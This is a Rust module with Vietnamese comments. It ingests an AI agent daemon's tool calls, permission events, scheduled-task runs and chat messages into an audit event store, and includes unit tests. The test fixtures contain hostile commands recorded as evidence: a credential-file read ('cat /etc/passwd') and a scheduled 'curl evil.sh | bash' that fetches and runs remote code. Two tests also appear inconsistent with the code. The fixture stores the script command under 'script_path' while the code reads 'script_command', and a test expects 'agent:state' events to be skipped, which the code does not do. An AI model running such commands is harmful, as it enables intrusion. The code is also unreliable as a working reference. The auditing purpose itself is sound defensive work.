//! Trích xuất một chiều: nguồn (chỉ-đọc) → `events` chuẩn hoá trong kho Sentinel.
//!
//! Con trỏ đi theo **khoá tăng dần của nguồn** (`tool_executions.id`,
//! `chat_events.id`, `task_run_logs.id`) chứ không theo thời gian. Đồng hồ có thể
//! nhảy, múi giờ có thể lệch, nhưng khoá tự tăng thì không — dùng thời gian làm
//! con trỏ là cách chắc chắn để mất sự kiện.
//!
//! Mọi sự kiện mang `src_key = "<nguồn>:<id gốc>"`, nên chạy lại ingest (kể cả
//! sau khi khôi phục con trỏ về 0) không sinh bản trùng.

use crate::db::{Db, NewEvent};
use crate::source::DaemonDb;
use anyhow::Result;
use serde_json::{json, Value};

/// Số dòng tối đa đọc mỗi nguồn mỗi lượt. Giữ lượt ingest ngắn để không cầm
/// khoá lâu và để lượt đầu tiên trên DB lớn không treo giao diện.
const BATCH: i64 = 2000;

pub struct IngestReport {
    pub copied: Vec<(String, i64)>,
    pub errors: Vec<(String, String)>,
}

impl IngestReport {
    pub fn to_value(&self) -> Value {
        json!({
            "copied": self.copied.iter().map(|(s, n)| json!({"source": s, "count": n})).collect::<Vec<_>>(),
            "total": self.copied.iter().map(|(_, n)| n).sum::<i64>(),
            "errors": self.errors.iter().map(|(s, e)| json!({"source": s, "error": e})).collect::<Vec<_>>(),
        })
    }
}

/// Rút gọn an toàn theo ranh giới ký tự — cắt bằng `&s[..n]` sẽ panic với tiếng
/// Việt có dấu (ký tự nhiều byte).
pub fn truncate_chars(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        return s.to_string();
    }
    let mut out: String = s.chars().take(n).collect();
    out.push('…');
    out
}

/// Lấy lệnh shell thật ra khỏi một dòng `tool_executions` của Bash.
/// `content_json.title` là chỗ duy nhất trong DB còn giữ lệnh (đã bị daemon cắt
/// 100 ký tự) — mọi tool khác đều mất sạch đối số.
fn bash_command(content: &Value) -> Option<String> {
    content["title"].as_str().map(|s| s.to_string())
}

pub fn ingest_tool_executions(app: &Db, dae: &DaemonDb) -> Result<i64> {
    if !dae.has_columns(
        "tool_executions",
        &["id", "chat_jid", "tool_name", "content_json", "ok", "timestamp"],
    ) {
        anyhow::bail!("bảng tool_executions thiếu cột cần dùng — bỏ qua nguồn này");
    }
    let after: i64 = app.cursor("tool_executions").parse().unwrap_or(0);
    let rows = dae.tool_executions_after(after, BATCH)?;
    let mut last = after;
    let mut n = 0i64;
    for r in &rows {
        let id = r["id"].as_i64().unwrap_or(0);
        last = last.max(id);
        let tool = r["tool_name"].as_str().unwrap_or("");
        let content: Value =
            serde_json::from_str(r["content_json"].as_str().unwrap_or("{}")).unwrap_or(json!({}));

        let mut detail = json!({
            "result_preview": truncate_chars(&content.to_string(), 1200),
        });
        if tool == "Bash" {
            if let Some(cmd) = bash_command(&content) {
                detail["command"] = json!(cmd);
            }
            if let Some(code) = content["exitCode"].as_i64() {
                detail["exit_code"] = json!(code);
            }
        }
        let summary = if let Some(c) = detail["command"].as_str() {
            format!("{tool}: {}", truncate_chars(c, 120))
        } else {
            let s = r["summary"].as_str().unwrap_or("");
            if s.is_empty() {
                tool.to_string()
            } else {
                format!("{tool}: {}", truncate_chars(s, 120))
            }
        };

        let e = NewEvent::new(
            "tool_executions",
            "tool_call",
            r["chat_jid"].as_str().unwrap_or("?"),
            r["timestamp"].as_str().unwrap_or(""),
        )
        .agent(r["agent_id"].as_str().unwrap_or("main"))
        .tool(tool)
        .ok(r["ok"].as_bool().unwrap_or(true))
        .summary(summary)
        .detail(detail)
        .key(format!("tool_executions:{id}"));

        if app.append_event(&e)?.is_some() {
            n += 1;
        }
    }
    app.set_cursor("tool_executions", &last.to_string(), n, None);
    Ok(n)
}

pub fn ingest_chat_events(app: &Db, dae: &DaemonDb) -> Result<i64> {
    if !dae.has_columns("chat_events", &["id", "chat_jid", "event_type", "payload", "timestamp"]) {
        anyhow::bail!("bảng chat_events thiếu cột cần dùng");
    }
    let after: i64 = app.cursor("chat_events").parse().unwrap_or(0);
    let rows = dae.chat_events_after(after, BATCH)?;
    let mut last = after;
    let mut n = 0i64;
    for r in &rows {
        let id = r["id"].as_i64().unwrap_or(0);
        last = last.max(id);
        let et = r["event_type"].as_str().unwrap_or("");
        let payload: Value =
            serde_json::from_str(r["payload"].as_str().unwrap_or("{}")).unwrap_or(json!({}));

        // Payload dùng camelCase (`toolName`) cho yêu cầu và `key` cho kết quả —
        // đọc nhầm sang snake_case sẽ ra rỗng ở mọi dòng.
        let tool = payload["toolName"]
            .as_str()
            .or_else(|| payload["tool_name"].as_str())
            .unwrap_or("");
        let choice = payload["key"].as_str().unwrap_or("");

        let kind = match et {
            "permission:request" => "permission_request",
            "permission:resolved" => "permission_resolved",
            "question:request" => "question_request",
            "question:resolved" => "question_resolved",
            other => other,
        };
        let summary = match et {
            "permission:request" => format!("hỏi phê duyệt: {}", if tool.is_empty() { "?" } else { tool }),
            "permission:resolved" => format!("phê duyệt → {}", if choice.is_empty() { "?" } else { choice }),
            _ => et.to_string(),
        };

        let mut e = NewEvent::new(
            "chat_events",
            kind,
            r["chat_jid"].as_str().unwrap_or("?"),
            r["timestamp"].as_str().unwrap_or(""),
        )
        .summary(summary)
        .detail(json!({
            "event_type": et,
            "request_id": r["request_id"].clone(),
            "choice": choice,
            "payload": payload,
        }))
        .key(format!("chat_events:{id}"));
        if !tool.is_empty() {
            e = e.tool(tool);
        }
        if app.append_event(&e)?.is_some() {
            n += 1;
        }
    }
    app.set_cursor("chat_events", &last.to_string(), n, None);
    Ok(n)
}

pub fn ingest_task_run_logs(app: &Db, dae: &DaemonDb) -> Result<i64> {
    if !dae.has_columns("task_run_logs", &["id", "task_id", "run_at", "status"]) {
        anyhow::bail!("bảng task_run_logs thiếu cột cần dùng");
    }
    // Định nghĩa lịch để gắn thêm ngữ cảnh (chế độ chạy, lệnh shell) vào từng lần
    // chạy — bản thân `task_run_logs` không ghi lại lệnh đã thực thi.
    let tasks = dae.scheduled_tasks().unwrap_or_default();
    let by_id: std::collections::HashMap<String, &Value> = tasks
        .iter()
        .map(|t| (t["id"].as_str().unwrap_or("").to_string(), t))
        .collect();

    let after: i64 = app.cursor("task_run_logs").parse().unwrap_or(0);
    let rows = dae.task_run_logs_after(after, BATCH)?;
    let mut last = after;
    let mut n = 0i64;
    for r in &rows {
        let id = r["id"].as_i64().unwrap_or(0);
        last = last.max(id);
        let task_id = r["task_id"].as_str().unwrap_or("");
        let status = r["status"].as_str().unwrap_or("");
        let t = by_id.get(task_id);
        let mode = t
            .map(|t| t["context_mode"].as_str().unwrap_or("?").to_string())
            .unwrap_or_else(|| "đã-xoá".into());

        let mut detail = json!({
            "task_id": task_id,
            "context_mode": mode,
            "status": status,
            "duration_ms": r["duration_ms"].clone(),
            "result_preview": truncate_chars(r["result"].as_str().unwrap_or(""), 800),
            "error": r["error"].clone(),
            "task_exists": t.is_some(),
        });
        if let Some(t) = t {
            detail["group_folder"] = t["group_folder"].clone();
            detail["schedule_value"] = t["schedule_value"].clone();
            if let Some(cmd) = t["script_command"].as_str() {
                detail["script_command"] = json!(cmd);
            }
        }

        let e = NewEvent::new(
            "task_run_logs",
            "schedule_run",
            &format!("schedule:{task_id}"),
            r["run_at"].as_str().unwrap_or(""),
        )
        .ok(status == "success")
        .summary(format!("lịch {mode} chạy → {status}"))
        .detail(detail)
        .key(format!("task_run_logs:{id}"));

        if app.append_event(&e)?.is_some() {
            n += 1;
        }
    }
    app.set_cursor("task_run_logs", &last.to_string(), n, None);
    Ok(n)
}

pub fn ingest_group_messages(app: &Db, dae: &DaemonDb) -> Result<i64> {
    if !dae.has_columns("group_messages", &["message_id", "chat_jid", "content", "timestamp"]) {
        anyhow::bail!("bảng group_messages thiếu cột cần dùng");
    }
    let after = app.cursor("group_messages");
    let after = if after == "0" { String::new() } else { after };
    let rows = dae.group_messages_after(&after, BATCH)?;
    let mut last = after;
    let mut n = 0i64;
    for r in &rows {
        let ts = r["timestamp"].as_str().unwrap_or("").to_string();
        if ts > last {
            last = ts.clone();
        }
        let content = r["content"].as_str().unwrap_or("");
        let from_me = r["is_from_me"].as_bool().unwrap_or(false);
        let e = NewEvent::new(
            "group_messages",
            "message",
            r["chat_jid"].as_str().unwrap_or("?"),
            &ts,
        )
        .summary(format!(
            "{}: {}",
            if from_me { "agent" } else { r["sender_name"].as_str().unwrap_or("người dùng") },
            truncate_chars(content, 140)
        ))
        .detail(json!({
            "is_from_me": from_me,
            "sender_name": r["sender_name"].clone(),
            "content": truncate_chars(content, 4000),
        }))
        .key(format!(
            "group_messages:{}:{}",
            r["chat_jid"].as_str().unwrap_or(""),
            r["message_id"].as_str().unwrap_or("")
        ));
        if app.append_event(&e)?.is_some() {
            n += 1;
        }
    }
    app.set_cursor("group_messages", &last, n, None);
    Ok(n)
}

/// Chạy toàn bộ đầu đọc. Một nguồn hỏng không được kéo sập các nguồn còn lại —
/// lỗi được ghi vào con trỏ của chính nguồn đó và hiện lên `/api/status`.
pub fn run_all(app: &Db) -> IngestReport {
    let mut rep = IngestReport {
        copied: vec![],
        errors: vec![],
    };
    let dae = match DaemonDb::open() {
        Ok(d) => d,
        Err(e) => {
            let msg = e.to_string();
            for s in ["tool_executions", "chat_events", "task_run_logs", "group_messages"] {
                app.set_cursor(s, &app.cursor(s), 0, Some(&msg));
            }
            rep.errors.push(("daemon_db".into(), msg));
            return rep;
        }
    };

    type Reader = (&'static str, fn(&Db, &DaemonDb) -> Result<i64>);
    let readers: [Reader; 4] = [
        ("tool_executions", ingest_tool_executions),
        ("chat_events", ingest_chat_events),
        ("task_run_logs", ingest_task_run_logs),
        ("group_messages", ingest_group_messages),
    ];
    for (name, f) in readers {
        match f(app, &dae) {
            Ok(n) => rep.copied.push((name.to_string(), n)),
            Err(e) => {
                let msg = e.to_string();
                app.set_cursor(name, &app.cursor(name), 0, Some(&msg));
                rep.errors.push((name.to_string(), msg));
            }
        }
    }
    rep
}

#[cfg(test)]
mod tests {
    use super::*;
    use rusqlite::Connection;
    use std::path::PathBuf;

    fn fake_daemon(dir: &std::path::Path) -> PathBuf {
        let p = dir.join("senclaw.db");
        let c = Connection::open(&p).unwrap();
        c.execute_batch(
            r#"
            CREATE TABLE tool_executions (
              id INTEGER PRIMARY KEY AUTOINCREMENT, chat_jid TEXT NOT NULL,
              agent_id TEXT NOT NULL DEFAULT 'main', tool_name TEXT NOT NULL,
              title TEXT NOT NULL DEFAULT '', summary TEXT NOT NULL DEFAULT '',
              content_json TEXT NOT NULL DEFAULT '{}', ok INTEGER NOT NULL DEFAULT 1,
              timestamp TEXT NOT NULL);
            CREATE TABLE chat_events (
              id INTEGER PRIMARY KEY AUTOINCREMENT, chat_jid TEXT NOT NULL,
              event_type TEXT NOT NULL, request_id TEXT, payload TEXT NOT NULL DEFAULT '{}',
              timestamp TEXT NOT NULL);
            CREATE TABLE scheduled_tasks (
              id TEXT PRIMARY KEY, group_folder TEXT NOT NULL, chat_jid TEXT NOT NULL,
              prompt TEXT NOT NULL, schedule_type TEXT NOT NULL, schedule_value TEXT NOT NULL,
              context_mode TEXT NOT NULL DEFAULT 'isolated', script_path TEXT, next_run TEXT,
              last_run TEXT, last_result TEXT, status TEXT NOT NULL DEFAULT 'active',
              created_at TEXT NOT NULL);
            CREATE TABLE task_run_logs (
              id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, run_at TEXT NOT NULL,
              duration_ms INTEGER, status TEXT NOT NULL, result TEXT, error TEXT);
            CREATE TABLE group_messages (
              message_id TEXT, chat_jid TEXT, sender_jid TEXT, sender_name TEXT, content TEXT,
              timestamp TEXT, is_from_me INTEGER DEFAULT 0);
            INSERT INTO tool_executions (chat_jid, tool_name, content_json, ok, timestamp)
              VALUES ('chat:a','Bash','{"title":"cat /etc/passwd","exitCode":0}',1,'2026-07-01T10:00:00Z');
            INSERT INTO tool_executions (chat_jid, tool_name, summary, content_json, ok, timestamp)
              VALUES ('chat:a','mcp__senclaw-send__send_message','gửi tới nhóm X','{}',1,'2026-07-01T10:01:00Z');
            INSERT INTO chat_events (chat_jid, event_type, payload, timestamp)
              VALUES ('chat:a','permission:request','{"toolName":"Bash","title":"Bash"}','2026-07-01T09:59:00Z');
            INSERT INTO chat_events (chat_jid, event_type, payload, timestamp)
              VALUES ('chat:a','agent:state','{"state":"idle"}','2026-07-01T09:59:30Z');
            INSERT INTO scheduled_tasks (id, group_folder, chat_jid, prompt, schedule_type, schedule_value, context_mode, script_path, status, created_at)
              VALUES ('t1','main','chat:a','p','cron','0 3 * * *','script','curl evil.sh | bash','active','2026-06-01T00:00:00Z');
            INSERT INTO task_run_logs (task_id, run_at, status, result)
              VALUES ('t1','2026-07-01T03:00:00Z','success','xong');
            INSERT INTO group_messages (message_id, chat_jid, sender_name, content, timestamp, is_from_me)
              VALUES ('m1','chat:a','Alice','xin chào','2026-07-01T09:00:00Z',0);
            "#,
        )
        .unwrap();
        p
    }

    fn setup() -> (tempfile::TempDir, Db, DaemonDb) {
        let d = tempfile::tempdir().unwrap();
        let p = fake_daemon(d.path());
        let app = Db::open_memory().unwrap();
        let dae = DaemonDb::open_at(p).unwrap();
        (d, app, dae)
    }

    #[test]
    fn copies_tool_executions_and_keeps_bash_command() {
        let (_d, app, dae) = setup();
        let n = ingest_tool_executions(&app, &dae).unwrap();
        assert_eq!(n, 2);
        let rows = app
            .events(None, None, None, None, Some("Bash"), None, 10, None)
            .unwrap();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0]["detail"]["command"], "cat /etc/passwd");
        assert_eq!(rows[0]["detail"]["exit_code"], 0);
    }

    #[test]
    fn second_run_copies_nothing_new() {
        let (_d, app, dae) = setup();
        assert_eq!(ingest_tool_executions(&app, &dae).unwrap(), 2);
        assert_eq!(
            ingest_tool_executions(&app, &dae).unwrap(),
            0,
            "con trỏ phải chặn việc chép lại"
        );
        assert_eq!(app.event_count(), 2);
    }

    #[test]
    fn rewinding_cursor_still_does_not_duplicate() {
        let (_d, app, dae) = setup();
        ingest_tool_executions(&app, &dae).unwrap();
        app.set_cursor("tool_executions", "0", 0, None);
        assert_eq!(
            ingest_tool_executions(&app, &dae).unwrap(),
            0,
            "src_key là lớp chống trùng thứ hai khi con trỏ bị lùi"
        );
        assert_eq!(app.event_count(), 2);
    }

    #[test]
    fn skips_agent_state_noise() {
        let (_d, app, dae) = setup();
        let n = ingest_chat_events(&app, &dae).unwrap();
        assert_eq!(n, 1, "agent:state là nhiễu trạng thái, không phải chứng cứ");
        let rows = app.events(None, None, None, Some("permission_request"), None, None, 10, None).unwrap();
        assert_eq!(rows[0]["tool_name"], "Bash");
    }

    #[test]
    fn run_log_inherits_schedule_context() {
        let (_d, app, dae) = setup();
        ingest_task_run_logs(&app, &dae).unwrap();
        let rows = app
            .events(None, None, None, Some("schedule_run"), None, None, 10, None)
            .unwrap();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0]["detail"]["context_mode"], "script");
        assert_eq!(rows[0]["detail"]["script_command"], "curl evil.sh | bash");
        assert_eq!(rows[0]["actor"], "schedule:t1");
    }

    #[test]
    fn messages_use_timestamp_cursor() {
        let (_d, app, dae) = setup();
        assert_eq!(ingest_group_messages(&app, &dae).unwrap(), 1);
        assert_eq!(ingest_group_messages(&app, &dae).unwrap(), 0);
    }

    #[test]
    fn truncate_handles_vietnamese_multibyte() {
        // `&s[..n]` sẽ panic ở đây; hàm phải cắt theo ký tự.
        let s = "điều tra bảo mật của tác nhân";
        let out = truncate_chars(s, 5);
        assert_eq!(out.chars().count(), 6, "5 ký tự + dấu …");
        assert!(out.starts_with("điều "));
    }

    #[test]
    fn broken_source_does_not_stop_the_others() {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("senclaw.db");
        let c = Connection::open(&p).unwrap();
        // Chỉ có tool_executions; các bảng khác thiếu hẳn.
        c.execute_batch(
            "CREATE TABLE tool_executions (
               id INTEGER PRIMARY KEY AUTOINCREMENT, chat_jid TEXT NOT NULL,
               agent_id TEXT NOT NULL DEFAULT 'main', tool_name TEXT NOT NULL,
               title TEXT NOT NULL DEFAULT '', summary TEXT NOT NULL DEFAULT '',
               content_json TEXT NOT NULL DEFAULT '{}', ok INTEGER NOT NULL DEFAULT 1,
               timestamp TEXT NOT NULL);
             INSERT INTO tool_executions (chat_jid, tool_name, timestamp)
               VALUES ('chat:a','Read','2026-07-01T00:00:00Z');",
        )
        .unwrap();
        drop(c);
        let app = Db::open_memory().unwrap();
        let dae = DaemonDb::open_at(p).unwrap();
        assert_eq!(ingest_tool_executions(&app, &dae).unwrap(), 1);
        assert!(ingest_chat_events(&app, &dae).is_err(), "nguồn thiếu bảng phải báo lỗi mềm");
        assert_eq!(app.event_count(), 1, "nguồn tốt vẫn được chép");
    }
}
